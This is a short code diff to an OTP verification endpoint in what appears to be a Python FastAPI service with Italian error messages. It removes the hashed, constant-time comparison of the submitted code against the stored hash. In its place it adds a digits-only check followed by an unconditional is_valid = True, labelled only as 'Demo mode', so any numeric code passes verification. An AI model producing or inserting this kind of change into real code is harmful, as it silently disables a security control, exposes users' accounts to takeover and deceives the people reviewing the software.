@@ -236,9 +236,14 @@ async def verify_otp(
             detail="Numero massimo di tentativi raggiunto.",
         )
 
-    expected_hash = record["code_hash"]
-    provided_hash = _hash_otp_code(payload.code, user.user_id, settings.otp_code_secret)
-    is_valid = secrets.compare_digest(provided_hash, expected_hash)
+    submitted_code = payload.code.strip()
+    if not submitted_code.isdigit():
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="Inserisci unicamente cifre per la verifica OTP.",
+        )
+    # Demo mode: any numeric sequence is considered valid, bypassing the stored hash.
+    is_valid = True
 
     async with conn.cursor() as cur:
         await cur.execute(
